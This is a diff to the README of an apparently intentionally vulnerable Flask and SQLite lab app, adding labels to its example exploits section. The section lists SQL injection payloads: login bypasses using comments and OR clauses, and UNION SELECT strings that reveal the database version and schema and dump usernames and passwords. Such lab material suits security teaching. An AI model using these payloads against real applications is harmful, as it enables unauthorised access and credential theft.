@@ -47,37 +47,42 @@ Start the Flask app:
 
 4. **Example Exploits (for SQLite):**
 
-   - **Bypass login with comment**
+   - **Bypass login with comment (login page)**
      ```
      admin'-- 
      ```
 
-   - **Check if injection is possible**
+   - **Bypass login with OR (login page)**
+     ```
+     admin' OR '1' = '1
+     ```
+
+   - **Check if injection is possible (stock page)**
      ```
      ' UNION SELECT 1,2,3,4,5; --
      ```
 
-   - **Get SQLite version**
+   - **Get SQLite version (stock page)**
      ```
      ' UNION SELECT sqlite_version(),2,3,4,5; --
      ```
 
-   - **Show tables**
+   - **Show tables (stock page)**
      ```
      ' UNION SELECT name, type, 3,4,5 FROM sqlite_master; --
      ```
 
-   - **Show SQL query with table info**
+   - **Show SQL query with table info (stock page)**
      ```
      ' UNION SELECT sql, 2,3,4,5 FROM sqlite_master WHERE type='table' AND name='users'; --
      ```
 
-   - **Dump all users**
+   - **Dump all users (stock page)**
      ```
      %' UNION SELECT username, password, 1, 2, 3 FROM users; --
      ```
 
-   - **List all tables and SQL schema**
+   - **List all tables and SQL schema (stock page)**
      ```
      ' UNION SELECT type, name, tbl_name, rootpage, sql FROM sqlite_master; --
      ```
